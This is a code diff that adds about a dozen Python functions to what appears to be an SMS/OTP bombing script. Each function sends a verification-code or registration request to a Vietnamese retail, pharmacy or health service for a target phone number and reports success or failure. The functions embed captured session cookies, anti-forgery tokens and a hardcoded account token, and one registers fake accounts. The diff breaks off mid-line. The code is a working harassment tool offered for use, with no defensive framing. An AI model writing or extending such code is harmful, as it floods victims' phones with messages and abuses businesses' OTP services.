@@ -2605,6 +2605,450 @@ def coolmate():
     except requests.exceptions.RequestException:
         print("COOLMATE | TRẠNG THÁI : THẤT BẠI")
         
+def mioto():
+    cookies = {
+        '_vid': 'Eiw8L9Ir5m56SIn0',
+        '_hv': '5d629960ddf467c1d7a29afc5d3a3c1436b2c9b1680d1239025b45d43aabf046',
+        '_mid': 'ul2e3a.Uj8WZEQYS_JNWRrU-iopyXPAY6FobQnefvd7bOpylODI9N-3P1zD-Nd9uVzbU8Pd1l0b4sqwdsAuaJwh8IMR7Q',
+        '_hs': '9d68724d1934e72230e831e5c1b302f3a6210c4b25f158a4f1a111bed851b7e8',
+    }
+
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        # 'content-length': '0',
+        # 'cookie': '_vid=Eiw8L9Ir5m56SIn0; _hv=5d629960ddf467c1d7a29afc5d3a3c1436b2c9b1680d1239025b45d43aabf046; _mid=ul2e3a.Uj8WZEQYS_JNWRrU-iopyXPAY6FobQnefvd7bOpylODI9N-3P1zD-Nd9uVzbU8Pd1l0b4sqwdsAuaJwh8IMR7Q; _hs=9d68724d1934e72230e831e5c1b302f3a6210c4b25f158a4f1a111bed851b7e8',
+        'origin': 'https://www.mioto.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://www.mioto.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    params = {
+        'phone': sdt,
+        'action': '1',
+        'otpBy': '0',
+    }
+
+    try:
+        response = requests.post('https://accounts.mioto.vn/mapi/phone/otp/gen', params=params, cookies=cookies, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("MIOTO | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MIOTO | TRẠNG THÁI : THẤT BẠI")
+
+def avakids():
+    cookies = {
+        'TBMCookie_3209819802479625248': '913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=',
+        '___utmvm': '###########',
+        '.AspNetCore.Antiforgery.Igz9_hL99hw': 'CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8',
+        'CookiesUserId': 'f717fb39-aca2-447e-86d8-43353b354242',
+        'MWG_CART_ID': 'e73eec56f3bc43c59790',
+        'MWG_CART_HAVE_PRODUCT': '',
+        'MWG_PRODUCT_BASIC_DB': 'm0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--',
+        'MWG_CART_SS_17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC',
+        'X-CSRF-TOKEN-MwgCart17': 'CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k',
+        'SvID': 'blki218|ZqB2J|ZqB2E',
+        'DMX_Personal': '%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D',
+        'mwgngxpv': '3',
+        'BONUSCART_CK': 'IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--',
+        '.AspNetCore.Antiforgery.dGH04W8MKvk': 'CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
+    }
+
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': 'TBMCookie_3209819802479625248=913589001721792014a7Mg2hhHa7pbVh+oCTfpJpA1Sks=; ___utmvm=###########; .AspNetCore.Antiforgery.Igz9_hL99hw=CfDJ8KCJ5TMsrhBIolL3aLeC8tgUGuuieZHIZ2cXAzdXCV0weIQMKIdaXaKHqWlFAxVrE5Mmx7MjY4DHsH057lcX75hawBGh2AFjqWR5v0sbzcTEpe213M95jEGw6a_EOBoGklFNPeg8y-tDvm0YJ2HFwq8; CookiesUserId=f717fb39-aca2-447e-86d8-43353b354242; MWG_CART_ID=e73eec56f3bc43c59790; MWG_CART_HAVE_PRODUCT=; MWG_PRODUCT_BASIC_DB=m0PtwM5f7zfBNFFqjl2heNWXVnT5cDCxQupf6Di11B_JfPHbQCuwFQ--; MWG_CART_SS_17=CfDJ8MR0DtoU1ltDp5DLN27lzqZ4YhPTRmbBDljODDlEJnUlV%2Bee2hGsJqDZO95ajUvteyCwhjJP5FqrwOBLYdppxI1k%2BvbqLYuJqF62Njl7iXdv%2FRsd8qq0AaBMkJsEnw9pRCgyeA16UEog6AShjid8R4ag1QxbIiNtqzkOaRXKukbC; X-CSRF-TOKEN-MwgCart17=CfDJ8MR0DtoU1ltDp5DLN27lzqaRiOuypmIDAgn58TM-0T-pk1i5_VodJPnd_mdrIBLnjHCBZswioCNqDgvvdawVVAaU011jYh0_Aur2wMBODvZJ_FbFhM3Jp5a91Pjw5cQCd9JokvXAR-lGVygSJJGFa3k; SvID=blki218|ZqB2J|ZqB2E; DMX_Personal=%7B%22UID%22%3A%22DMX%22%2C%22ProvinceId%22%3A3%2C%22Address%22%3Anull%2C%22Culture%22%3A%22vi-3%22%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22DistrictId%22%3A0%2C%22WardId%22%3A0%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22CRMCustomerId%22%3Anull%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerEmail%22%3Anull%2C%22CustomerIdentity%22%3Anull%2C%22CustomerBirthday%22%3Anull%2C%22CustomerAddress%22%3Anull%2C%22IsDefault%22%3Afalse%2C%22IsFirst%22%3Afalse%7D; mwgngxpv=3; BONUSCART_CK=IoHfQ0np2zMfLJWaplKPR%2FdZVOKMK3Na4qz7P4lNgFPPpBjWeGmR9dYYMle3cbcHwmpI9sqRBZwtPWHomp7phw--; .AspNetCore.Antiforgery.dGH04W8MKvk=CfDJ8LNt9duCvo5JgR90L8go8A6MNFRuMLytIZWVy85L0q2oLN1xh4JosZKHzuAuZ8EGmvSLazpfZMG9yIOdNtCbLLMJUI1gS9Toaz9Eu2PuYCaiiNZtT_jy4EPlOsYNyS7SalhePWKxBZTjqaqdbfVAZcE',
+        'Origin': 'https://www.avakids.com',
+        'Referer': 'https://www.avakids.com/lich-su-mua-hang/dang-nhap',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'X-Requested-With': 'XMLHttpRequest',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    data = {
+        'phoneNumber': sdt,
+        'isReSend': 'false',
+        'sendOTPType': '1',
+        '__RequestVerificationToken': 'CfDJ8LNt9duCvo5JgR90L8go8A4qec6je7UJneAEXpEnc1-pqL-ZhM0205u4tpJk_DIjUdFs6h3cKTmiajRZTuKWWa10Jc_6AaKkwS6nVuOhbRpi7x89B9Bqxn78GuIW1vTEVRF-pJchKrCm2KbNOqG_1Bs',
+    }
+
+    try:
+        response = requests.post(
+            'https://www.avakids.com/lich-su-mua-hang/LoginV2/GetVerifyCode',
+            cookies=cookies,
+            headers=headers,
+            data=data,
+        )
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("AVAKIDS | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("AVAKIDS | TRẠNG THÁI : THẤT BẠI")
+
+def giathuoctot():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://giathuoctot.com',
+        'priority': 'u=1, i',
+        'referer': 'https://giathuoctot.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'phoneNo': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.giathuoctot.com/user/otp', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("GIATHUOCTOT | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("GIATHUOCTOT | TRẠNG THÁI : THẤT BẠI")
+
+def medigozl():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://www.medigoapp.com',
+        'priority': 'u=1, i',
+        'referer': 'https://www.medigoapp.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    params = {
+        'from': 'ZALO',
+    }
+
+    json_data = {
+        'phone': sdt_chuyen_doi,
+    }
+
+    try:
+        response = requests.post('https://auth.medigoapp.com/prod/getOtp', params=params, headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("MEDIGOZL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MEDIGOZL | TRẠNG THÁI : THẤT BẠI")
+
+def pharmartzl():
+    cookies = {
+        'bppsession2021': 'ms0ocs045k27kqmte9sddlq122054ifo',
+        'isAT': '0',
+        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
+        'mp_sid': '1721792970118.5579',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
+        'origin': 'https://www.pharmart.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://www.pharmart.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone': sdt,
+        'type': 'zalo',
+    }
+
+    try:
+        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("PHARMARTZL | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("PHARMARTZL | TRẠNG THÁI : THẤT BẠI")
+
+def pharmartsms():
+    cookies = {
+        'bppsession2021': 'ms0ocs045k27kqmte9sddlq122054ifo',
+        'isAT': '0',
+        'viteexConfig': '%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D',
+        'mp_sid': '1721792970118.5579',
+    }
+
+    headers = {
+        'accept': 'application/json, text/javascript, */*; q=0.01',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'cookie': 'bppsession2021=ms0ocs045k27kqmte9sddlq122054ifo; isAT=0; viteexConfig=%7B%22app_id%22%3A%22WmGeN7P4Kl%22%2C%22app_domain%22%3A%22https%3A//www.pharmart.vn/%22%2C%22app_status%22%3A10%2C%22public_key%22%3A%22BBFdWlBvcdt2ipHo2GqJbF8I3262KrNlAvDV1HOCLOH4Ve3etJCu-HGMzhxoQWTQ2DCa-XlF--Lr-MjjXIlgNyQ%22%2C%22not_ask_allow_in_day%22%3A1%2C%22alwaysSubcribe%22%3A0%2C%22is_track_reload_url%22%3A0%2C%22max_receive%22%3A0%2C%22notif_welcome%22%3A%5B%5D%7D; mp_sid=1721792970118.5579',
+        'origin': 'https://www.pharmart.vn',
+        'priority': 'u=1, i',
+        'referer': 'https://www.pharmart.vn/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-origin',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'x-requested-with': 'XMLHttpRequest',
+    }
+
+    data = {
+        'phone': sdt,
+        'type': 'sms',
+    }
+
+    try:
+        response = requests.post('https://www.pharmart.vn/send-otp', cookies=cookies, headers=headers, data=data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("PHARMARTSMS | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("PHARMARTSMS | TRẠNG THÁI : THẤT BẠI")
+
+def medigosms():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'content-type': 'application/json',
+        'origin': 'https://www.medigoapp.com',
+        'priority': 'u=1, i',
+        'referer': 'https://www.medigoapp.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    json_data = {
+        'phone': sdt_chuyen_doi,
+    }
+
+    try:
+        response = requests.post('https://auth.medigoapp.com/prod/getOtp', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("MEDIGOSMS | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("MEDIGOSMS | TRẠNG THÁI : THẤT BẠI")
+
+def jiohealth():
+    headers = {
+        'accept': 'application/json, text/plain, */*',
+        'accept-language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'app-location': 'VN',
+        'content-type': 'application/x-www-form-urlencoded',
+        'origin': 'https://pharmacy.jiohealth.com',
+        'priority': 'u=1, i',
+        'referer': 'https://pharmacy.jiohealth.com/',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+        'sec-fetch-dest': 'empty',
+        'sec-fetch-mode': 'cors',
+        'sec-fetch-site': 'same-site',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+    }
+
+    params = {
+        'userID': '1647648',
+        'token': '3ca29173-07f7-48c1-ad0f-68f1a460fb38',
+        'phoneNumber': sdt,
+        'phoneCountryID': '6',
+        'loginAccountTypeID': '0',
+        'isChangePhone': '0',
+    }
+
+    data = '{}'
+
+    try:
+        response = requests.post(
+            'https://prod.jiohealth.com:8443/JioPharmacy/rest/jio/sendSMSPhoneVerification',
+            params=params,
+            headers=headers,
+            data=data,
+        )
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("JIOHEALTH | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("JIOHEALTH | TRẠNG THÁI : THẤT BẠI")
+
+def ddmevabereg():
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/json',
+        'Origin': 'https://dinhduongmevabe.com.vn',
+        'Referer': 'https://dinhduongmevabe.com.vn/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    json_data = {
+        'userType': 'BabySitter',
+        'provinceId': 1,
+        'password': '123123aA@',
+        'fullName': 'kcoo ten',
+        'authenticationMode': 'Internal',
+        'socialUserId': '',
+        'socialToken': '',
+        'phoneNumber': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/Register', headers=headers, json=json_data)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("DDMEVABE REG | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("DDMEVABE REG | TRẠNG THÁI : THẤT BẠI")
+
+def ddmevabe():
+    headers = {
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        # 'Content-Length': '0',
+        'Origin': 'https://dinhduongmevabe.com.vn',
+        'Referer': 'https://dinhduongmevabe.com.vn/',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
+        'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Opera";v="112"',
+        'sec-ch-ua-mobile': '?0',
+        'sec-ch-ua-platform': '"Windows"',
+    }
+
+    params = {
+        'userName': sdt,
+    }
+
+    try:
+        response = requests.post('https://api.dinhduongmevabe.com.vn/api/User/GetVerifyPhoneNumberCode', params=params, headers=headers)
+        response.raise_for_status()  # Raise an exception for HTTP errors
+        print("DDMEVABE | TRẠNG THÁI : THÀNH CÔNG")
+    except requests.exceptions.RequestException:
+        print("DDMEVABE | TRẠNG THÁI : THẤT BẠI")
+
+def nhathuocankhang():
+    cookies = {
+        '___utmvm': '###########',
+        '.AspNetCore.Antiforgery.PgYZnA9bRvk': 'CfDJ8MYaQjD04aBHj9meZl7eRqI3A2HboqNnhlow3nIbtSN1KebuCGK6Cc6IuNcfibOGjCM8Fz5YBSZbkIvW3ggg0LhTlWWOaTsLCwIM_9Zd3fdeEQuEjuLde5-WANEX1rQLaVVWdWxnFBWUqvXyCPq9PL8',
+        'DMX_Personal': '%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D',
+        'MWG_PRODUCT_BASIC_DB': '8abgNefqT1OLKPUy9CdlGphoh4YH1TCUQ2O8qfDSoTekJWN9DlHZHg--',
+        'MWG_CART_HAVE_PRODUCT': '',
+        'MWG_CART_SS_10': 'CfDJ8HejTqTgEXlOoIeW1CutofMSwf1KBlmYkBfvOjkoALoH4r9xxvwWrnep7coXkJ%2Fr4%2BKm0gHg13xdJtoqPNe%2BrMAf00o06k6zN5Aru0jt5sJ1EvaRjAh2Yi5TnF8wskNe2GIa29%2FCi5DWsgrcDyw6Rej%2FjlOIR0Cntv6woICxpxua',
+        '.AspNetCore.Antiforgery.NTCLGRwicAo': 'CfDJ8AOPS3HyLgBFlxCZc71KlZMgfnidzWeReJosd0ECag31BBIyv_udfMtl7ykWkPlIQyiCQUZDw9-HMt1E5Kp16PBFLng9tVdT6Ny-RW6zRfoujkBkZZ63o43Bqr9XfvDgetbCthg1rNQeScZ8kHw80_c',
+        'ASP.NET_SessionId': 'cbfs1ut3q3kq5wzq4cdmk04o',
+        'MWG_ORDERHISTORY_SS_10': 'CfDJ8AOPS3HyLgBFlxCZc71KlZM%2B7YdGYg1Uay0HvcY5I9exurDcJwezpyegUKYLmXZrsIZCsThbwITQlbQYm%2FwU5on0n3LaP4VSt96mph3WHOviP0y0cgaEGb5QPwtDGFhmyLn27SYEE5cPnWZsV9HLxfXjJnemr8utUw94BP29JXXk',
+        'TBMCookie_3209819802479625248': '837581001721796736QEZtdvzz0Kums067KBceEASslN8=',
+        'SvID': 'ak213|ZqCIh|ZqCBh',
+        '___utmvc': "navigator%3Dtrue,navigator.vendor%3DGoogle%20Inc.,navigator.appName%3DNetscape,navigator.plugins.length%3D%3D0%3Dfalse,navigator.platform%3DWin32,navigator.webdriver%3Dfalse,plugin_ext%3Dno%20extention,ActiveXObject%3Dfalse,webkitURL%3Dtrue,_phantom%3Dfalse,callPhantom%3Dfalse,chrome%3Dtrue,yandex%3Dfalse,opera%3Dfalse,opr%3Dtrue,safari%3Dfalse,awesomium%3Dfalse,puffinDevice%3Dfalse,__nightmare%3Dfalse,domAutomation%3Dfalse,domAutomationController%3Dfalse,_Selenium_IDE_Recorder%3Dfalse,document.__webdriver_script_fn%3Dfalse,document.%24cdc_asdjflasutopfhvcZLmcfl_%3Dfalse,process.version%3Dfalse,navigator.cpuClass%3Dfalse,navigator.oscpu%3Dfalse,navigator.connection%3Dtrue,navigator.language%3D%3D'C'%3Dfalse,window.outerWidth%3D%3D0%3Dfalse,window.outerHeight%3D%3D0%3Dfalse,window.WebGLRenderingContext%3Dtrue,document.documentMode%3Dundefined,eval.toString().length%3D33,digest=",
+    }
+
+    headers = {
+        'Accept': '*/*',
+        'Accept-Language': 'vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Connection': 'keep-alive',
+        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
+        # 'Cookie': "___utmvm=###########; .AspNetCore.Antiforgery.PgYZnA9bRvk=CfDJ8MYaQjD04aBHj9meZl7eRqI3A2HboqNnhlow3nIbtSN1KebuCGK6Cc6IuNcfibOGjCM8Fz5YBSZbkIvW3ggg0LhTlWWOaTsLCwIM_9Zd3fdeEQuEjuLde5-WANEX1rQLaVVWdWxnFBWUqvXyCPq9PL8; DMX_Personal=%7B%22CustomerId%22%3A0%2C%22CustomerSex%22%3A-1%2C%22CustomerName%22%3Anull%2C%22CustomerPhone%22%3Anull%2C%22CustomerMail%22%3Anull%2C%22Lat%22%3A0.0%2C%22Lng%22%3A0.0%2C%22Address%22%3Anull%2C%22CurrentUrl%22%3Anull%2C%22ProvinceId%22%3A3%2C%22ProvinceName%22%3A%22H%E1%BB%93%20Ch%C3%AD%20Minh%22%2C%22DistrictId%22%3A0%2C%22DistrictType%22%3Anull%2C%22DistrictName%22%3Anull%2C%22WardId%22%3A0%2C%22WardType%22%3Anull%2C%22WardName%22%3Anull%2C%22StoreId%22%3A0%2C%22CouponCode%22%3Anull%2C%22HasLocation%22%3Afalse%7D; MWG_PRODUCT_BASIC_DB=8abgNefqT1OLKPUy9CdlGphoh4YH1TCUQ2O8qfDSoTekJWN9DlHZHg--; MWG_CART_HAVE_PRODUCT=; MWG_CART_SS_10=CfDJ8HejTqTgEXlOoIeW1CutofMSwf1KBlmYkBfvOjkoALoH4r9xxvwWrnep7coXkJ%2Fr4%2BKm0gHg13xdJtoqPNe%2BrMAf00o06k6zN5Aru0jt5sJ1EvaRjAh2Yi5TnF8wskNe2GIa29%2FCi5DWsgrcDyw6Rej%2FjlOIR0Cntv6woICxpxua; .AspNetCore.Antiforgery.NTCLGRwicAo=CfDJ8AOPS3HyLgBFlxCZc71KlZMgfnidzWeReJosd0ECag31BBIyv_udfMtl7ykWkPlIQyiCQUZDw9-HMt1E5Kp16PBFLng9tVdT6Ny-RW6zRfoujkBkZZ63o43Bqr9XfvDgetbCthg1rNQeScZ8kHw80_c; ASP.NET_SessionId=cbfs1ut3q3kq5wzq4cdmk04o; MWG_ORDERHISTORY_SS_10=CfDJ8AOPS3HyLgBFlxCZc71KlZM%2B7YdGYg1Uay0HvcY5I9exurDcJwezpyegUKYLmXZrsIZCsThbwITQlbQYm%2FwU5on0n3LaP4VSt96mph3WHOviP0y0cgaEGb5QPwtDGFhmyLn27SYEE5cPnWZsV9HLxfXjJnemr8utUw94BP29JXXk; 